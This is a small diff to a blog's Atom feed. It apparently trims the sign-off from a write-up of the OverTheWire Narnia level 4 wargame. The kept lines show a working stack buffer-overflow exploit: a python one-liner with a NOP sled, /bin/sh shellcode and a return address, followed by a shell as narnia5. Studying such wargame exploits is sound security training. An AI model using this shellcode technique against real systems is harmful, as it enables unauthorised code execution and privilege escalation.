@@ -806,8 +806,4 @@ Stack level 0, frame at 0xffffd5e0:
 &lt;span class="n"&gt;narnia4&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia4&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;
 &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;whoami&lt;/span&gt;
 &lt;span class="n"&gt;narnia5&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;hr /&gt;
-&lt;p&gt;&lt;strong&gt;Aloha, bt3&lt;/strong&gt;&lt;/p&gt;</summary><category term="Buffer_Overflow"></category><category term="Stack_Overflow NOP"></category><category term="C"></category><category term="Assembly"></category><category term="gdb"></category><category term="Wargames"></category><category term="Linux"></category></entry></feed>
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="Buffer_Overflow"></category><category term="Stack_Overflow NOP"></category><category term="C"></category><category term="Assembly"></category><category term="gdb"></category><category term="Wargames"></category><category term="Linux"></category></entry></feed>
